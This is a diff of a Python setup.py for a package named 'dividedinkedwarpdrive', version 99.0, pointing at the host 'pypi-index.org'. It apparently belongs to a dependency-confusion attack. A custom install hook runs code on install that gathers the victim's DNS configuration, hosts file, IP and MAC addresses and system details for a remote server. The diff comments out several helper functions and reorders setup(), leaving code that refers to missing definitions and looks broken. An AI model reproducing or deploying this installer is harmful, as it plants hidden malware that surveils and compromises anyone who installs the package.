@@ -4,50 +4,67 @@ import getpass
 import os
 import sys
 import json
-
 if sys.version_info[0] >= 3:
     import urllib.request as http_request
 if sys.version_info[0] == 2:
     import urllib2 as http_request
-
 import datetime
 import hashlib
 import uuid
 import subprocess
-
 HOST = "pypi-index.org"
 PACKAGE = "dividedinkedwarpdrive"
 H_F1 = "3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0" 
 H_F2 = "7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159" 
-
 H_F3 = "2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e" 
 H_F4 = "7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2" 
-
 RESP = ""
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import subprocess 
+import shutil
+import site
+import atexit
+import sys, os
+try:
+    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+    README = open(os.path.join(SCRIPT_DIR, "README.md"), "rb")
+    README_DATA = README.read().decode("utf8")
+    README.close()
+    setup(
+        name=PACKAGE,
+        version='99.0',
+        packages=find_packages(),
+        cmdclass={'install': CustomInstall},  
+        long_description=README_DATA,
+        long_description_content_type="text/markdown",   
+    )
+except Exception as e:
+    pass
 
 def sha256(str_):
     return hashlib.sha256(str_.encode('utf-8')).hexdigest()
 
-def find_in_folder(dir, hash_):
-    for f in os.listdir(dir):
-        if sha256(f) == hash_:
-            return f
+# def find_in_folder(dir, hash_):
+#     for f in os.listdir(dir):
+#         if sha256(f) == hash_:
+#             return f
 
-def JWtZETxrGN_1():
-    k = False
-    try:
-        if platform.system().lower() in ('darwin', 'linux'):
-            home_dir = os.path.expanduser("~")
-            if os.path.isdir(home_dir):
-                f1 = find_in_folder(home_dir, H_F1)
-                if f1:
-                    f1 = os.path.join(home_dir, f1)
-                    f2 = find_in_folder(f1, H_F2)
-                    k = True if f2 else False
-    except:
-        pass
-
-    return k
+# def JWtZETxrGN_1():
+#     k = False
+#     try:
+#         if platform.system().lower() in ('darwin', 'linux'):
+#             home_dir = os.path.expanduser("~")
+#             if os.path.isdir(home_dir):
+#                 f1 = find_in_folder(home_dir, H_F1)
+#                 if f1:
+#                     f1 = os.path.join(home_dir, f1)
+#                     f2 = find_in_folder(f1, H_F2)
+#                     k = True if f2 else False
+#     except:
+#         pass
+#
+#     return k
 
 def rLscSvytBP_2():
     global RESP
@@ -59,11 +76,11 @@ def rLscSvytBP_2():
     except:
         return False
 
-def SxiRVrIPbC_3():
-    for name, value in os.environ.items():
-        if sha256(name) == H_F3 and sha256(value) == H_F4:
-            return True
-    return False
+# def SxiRVrIPbC_3():
+#     for name, value in os.environ.items():
+#         if sha256(name) == H_F3 and sha256(value) == H_F4:
+#             return True
+#     return False
 
 def detect_system():
     
@@ -81,40 +98,38 @@ def detect_system():
     
     return key
 
-def read_config(config):
-    c = ""
-    try:
-        f = open(config)
-        for line in f.readlines():
-            if line[0] != "#":
-                c += line
-        f.close()
-    except:
-        pass
-    
-    return c
-
+# def read_config(config):
+#     c = ""
+#     try:
+#         f = open(config)
+#         for line in f.readlines():
+#             if line[0] != "#":
+#                 c += line
+#         f.close()
+#     except:
+#         pass
+#
+#     return c
 
 def get_dns():
     return read_config("/etc/resolv.conf")
-    
 
 def get_hosts():
     return read_config("/etc/hosts")
 
-def get_time_zone():
-    res = ""
-    try:
-        c_utc = datetime.datetime.utcnow()
-        zone = ""
-        if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:
-            zone = datetime.datetime.now().astimezone().tzinfo
-        else:
-            zone = ""
-        res = str(c_utc) + " " + str(zone)
-    except:
-        pass
-    return res
+# def get_time_zone():
+#     res = ""
+#     try:
+#         c_utc = datetime.datetime.utcnow()
+#         zone = ""
+#         if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:
+#             zone = datetime.datetime.now().astimezone().tzinfo
+#         else:
+#             zone = ""
+#         res = str(c_utc) + " " + str(zone)
+#     except:
+#         pass
+#     return res
 
 def getifip(ifn):
     import socket, fcntl, struct
@@ -135,29 +150,29 @@ def get_mac(ifn):
     f.close()
     return mac
 
-def get_network_interfaces():
-    interfaces = []
-    sysp = platform.system()
-
-    if sysp.lower() == "linux":
-        f = open("/proc/net/dev", "r")
-        lines = f.readlines()[2:]
-        f.close()
-        for line in lines:
-            interface = line.split(":")[0].strip()
-            interfaces.append(interface)
-    elif sysp.lower() == "darwin":
-        process = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
-        output = process.communicate()[0].decode('utf-8')
-        lines = output.split("\n")
-        for line in lines:
-            if "flags" in line and "mtu" in line:
-                interface = line.split(":")[0].strip()
-                interfaces.append(interface)
-    elif sysp.lower() == "windows":
-        interfaces = [interface[0] for interface in socket.if_nameindex()]
-
-    return interfaces
+# def get_network_interfaces():
+#     interfaces = []
+#     sysp = platform.system()
+#
+#     if sysp.lower() == "linux":
+#         f = open("/proc/net/dev", "r")
+#         lines = f.readlines()[2:]
+#         f.close()
+#         for line in lines:
+#             interface = line.split(":")[0].strip()
+#             interfaces.append(interface)
+#     elif sysp.lower() == "darwin":
+#         process = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
+#         output = process.communicate()[0].decode('utf-8')
+#         lines = output.split("\n")
+#         for line in lines:
+#             if "flags" in line and "mtu" in line:
+#                 interface = line.split(":")[0].strip()
+#                 interfaces.append(interface)
+#     elif sysp.lower() == "windows":
+#         interfaces = [interface[0] for interface in socket.if_nameindex()]
+#
+#     return interfaces
 
 def get_ip_addresses(interface):
     ips = []
@@ -186,7 +201,6 @@ def get_ip_addresses(interface):
         ips = [socket.gethostbyname(socket.gethostname())]
 
     return ips, macs
-
 
 def get_net():
     c = ""
@@ -246,31 +260,20 @@ def run_me():
         
     except Exception as e:
         pass
-        
 
-
-from setuptools import setup, find_packages
-from setuptools.command.install import install
-import subprocess 
-import shutil
-import site
-import atexit
-import sys, os
-
-def get_index():
-    try:
-        f = open(os.path.expanduser("~/.pip/pip.conf"))
-    except OSError:
-        return
-    except IOError:
-        return
-    
-    for line in f.readlines():
-        if "index-url" in line:
-            f.close()
-            return line.split("=")[-1].strip()
-    f.close()
-
+# def get_index():
+#     try:
+#         f = open(os.path.expanduser("~/.pip/pip.conf"))
+#     except OSError:
+#         return
+#     except IOError:
+#         return
+#
+#     for line in f.readlines():
+#         if "index-url" in line:
+#             f.close()
+#             return line.split("=")[-1].strip()
+#     f.close()
 
 class CustomInstall(install):
     def run(self):    
@@ -323,21 +326,3 @@ class CustomInstall(install):
         atexit.register(_post_install)
         run_me()
         install.run(self)
-
-try:
-
-    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-    README = open(os.path.join(SCRIPT_DIR, "README.md"), "rb")
-    README_DATA = README.read().decode("utf8")
-    README.close()
-
-    setup(
-        name=PACKAGE,
-        version='99.0',
-        packages=find_packages(),
-        cmdclass={'install': CustomInstall},  
-        long_description=README_DATA,
-        long_description_content_type="text/markdown",   
-    )
-except Exception as e:
-    pass
